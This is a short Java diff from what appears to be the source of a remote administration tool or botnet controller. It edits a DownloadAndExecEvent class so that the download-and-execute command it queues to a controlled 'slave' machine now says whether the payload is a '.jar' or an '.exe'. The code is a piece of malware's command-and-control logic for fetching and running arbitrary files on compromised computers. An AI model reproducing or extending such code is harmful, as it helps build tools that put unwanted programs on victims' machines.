@@ -24,7 +24,7 @@ public class DownloadAndExecEvent extends Event {
 	}
 
 	public void perform(Slave slave) {
-		slave.addToSendQueue(new Packet17DownloadExecute(url));
+		slave.addToSendQueue(new Packet17DownloadExecute(url, jar ? ".jar" : ".exe"));
 	}
 
 	public String toString() {
